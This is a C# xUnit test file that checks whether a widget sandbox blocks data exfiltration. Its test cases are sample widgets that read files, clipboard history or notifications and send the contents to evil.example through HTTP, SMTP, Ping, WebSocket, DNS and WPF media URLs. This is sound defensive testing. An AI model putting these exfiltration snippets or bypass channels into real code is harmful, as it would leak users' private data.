using System;
using ShoreHue.UI.Widgets.Dynamic;
using Xunit;

namespace ShoreHue.Tests;

/// <summary>
/// ★ 安全审计语料（2026-09 第二轮）：针对"数据流出口清单偏窄 / WPF 媒体类 / 宿主能力出口 / foreach 污点传播"
/// 的一组绕过样本。每条都必须**能编译**，再断言沙箱拦截 —— 先红后修，修完留作回归。
/// </summary>
public class SandboxAuditTests
{
    private static string Widget(string body) =>
        "using System;\nusing System.IO;\nusing System.Net.Http;\nusing System.Threading.Tasks;\n" +
        "using System.Windows;\nusing System.Windows.Controls;\n" +
        "public class W : UserControl { public async Task Run(string path) {\n" + body + "\n} }";

    private static string Check(string body)
    {
        string src = Widget(body);
        string compileErr = WidgetCompiler.Validate("audit", src);
        Assert.True(compileErr.Length == 0, "样本本身编译不过（是语料问题）：\n" + compileErr);
        return WidgetCompiler.SandboxErrors(src, "");
    }

    // ===== 1. 宿主能力出口 =====
    [Fact] public void 外泄_经OpenExternally_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); ShoreHue.UI.Widgets.HostCapabilities.OpenExternally(\"https://evil.example/?d=\" + d);"));

    [Fact] public void 外泄_经AskAiAsync_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); await ShoreHue.UI.Widgets.HostCapabilities.AskAiAsync(\"总结：\" + d);"));

    // ===== 2. 网络出口清单缺口 =====
    [Fact] public void 外泄_经SmtpClient_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); using var c = new System.Net.Mail.SmtpClient(\"smtp.evil.example\"); c.Send(\"a@b.c\", \"d@e.f\", \"s\", d);"));

    [Fact] public void 外泄_经Ping_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); var p = new System.Net.NetworkInformation.Ping(); p.Send(\"evil.example\", 1000, System.Text.Encoding.UTF8.GetBytes(d));"));

    [Fact] public void 外泄_经ClientWebSocket_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); var ws = new System.Net.WebSockets.ClientWebSocket(); await ws.ConnectAsync(new Uri(\"wss://evil.example/\" + d), default);"));

    // ===== 3. WPF 媒体类（内部会发起 HTTP GET）=====
    [Fact] public void 外泄_经BitmapImage_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); var b = new System.Windows.Media.Imaging.BitmapImage(new Uri(\"https://evil.example/?d=\" + d));"));

    [Fact] public void 外泄_经MediaPlayer_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); var m = new System.Windows.Media.MediaPlayer(); m.Open(new Uri(\"https://evil.example/?d=\" + d));"));

    // ===== 4. 集合/foreach 污点传播 =====
    [Fact] public void 外泄_遍历通知集合_必须拦()
        => Assert.NotEqual("", Check("foreach (var n in ShoreHue.UI.Widgets.HostCapabilities.Notifications) { await new HttpClient().PostAsync(\"https://evil.example\", new StringContent(n.Message)); }"));

    [Fact] public void 外泄_遍历剪贴板历史_必须拦()
        => Assert.NotEqual("", Check("var c = ShoreHue.UI.Widgets.HostCapabilities.ClipboardHistory; foreach (var it in c.History) { await new HttpClient().PostAsync(\"https://evil.example\", new StringContent(it.DisplayText ?? \"\")); }"));

    // ===== 5. 回归：经 HttpClient / Dns 仍要拦（确认没改坏）=====
    [Fact] public void 回归_HttpClient读文件_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); await new HttpClient().PostAsync(\"https://evil.example\", new StringContent(d));"));

    [Fact] public void 回归_Dns读文件_必须拦()
        => Assert.NotEqual("", Check("var d = System.IO.File.ReadAllText(path); System.Net.Dns.GetHostAddresses(d + \".evil.example\");"));

    // ===== 6. 良性：不应误杀 =====
    [Fact] public void 良性_只读文件显示_放行()
        => Assert.Equal("", Check("var d = System.IO.File.ReadAllText(path); var t = new TextBlock { Text = d }; Content = t;"));

    [Fact] public void 良性_打开网页常量_放行()
        => Assert.Equal("", Check("ShoreHue.UI.Widgets.HostCapabilities.OpenExternally(\"https://example.com\");"));
}